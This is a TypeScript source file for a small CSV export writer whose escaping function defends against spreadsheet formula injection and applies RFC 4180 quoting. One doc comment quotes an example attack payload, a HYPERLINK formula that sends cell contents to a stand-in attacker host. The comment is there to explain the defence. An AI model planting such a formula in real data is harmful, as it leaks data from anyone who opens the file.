/**
 * Minimal, dependency-free CSV writer for the report exports.
 *
 * Hand-rolled on purpose: the export shapes are a handful of flat rows, and a
 * CSV library would be a new dependency in the container for something this
 * small. What a library WOULD have given us for free is the escaping, so both
 * parts of it are implemented and tested explicitly here.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIXES = ['=', '+', '-', '@'];
/** Leading control characters Excel also treats as formula-ish. */
const CONTROL_PREFIXES = ['\t', '\r'];

export type CsvValue = string | number | boolean | null | undefined;

/**
 * Escapes one field.
 *
 * Two independent concerns, in order:
 *
 * 1. CSV INJECTION. A cell whose text begins with =, +, -, @ (or a leading tab
 *    / CR) is executed as a formula when the file is opened in Excel, Sheets,
 *    or LibreOffice — so an attacker-controlled string like
 *    `=HYPERLINK("http://evil/?"&A1)` exfiltrates data the moment an admin
 *    opens the export. The mitigation is to prefix the cell with a single
 *    quote, which spreadsheets treat as "this is literal text". The visible
 *    value is unchanged.
 *
 * 2. CSV QUOTING. Fields containing a comma, quote, or newline get wrapped in
 *    double quotes with inner quotes doubled (RFC 4180).
 */
export function escapeCsvField(value: CsvValue): string {
  if (value === null || value === undefined) {
    return '';
  }
  let text = String(value);

  const firstChar = text.charAt(0);
  if (FORMULA_PREFIXES.includes(firstChar) || CONTROL_PREFIXES.includes(firstChar)) {
    text = `'${text}`;
  }

  if (/[",\r\n]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

/**
 * Renders a header row plus data rows as a CSV document. CRLF line endings
 * (RFC 4180) so Excel on Windows doesn't render one long line.
 */
export function toCsv(headers: readonly string[], rows: readonly CsvValue[][]): string {
  const lines = [
    headers.map(escapeCsvField).join(','),
    ...rows.map((row) => row.map(escapeCsvField).join(',')),
  ];
  return `${lines.join('\r\n')}\r\n`;
}
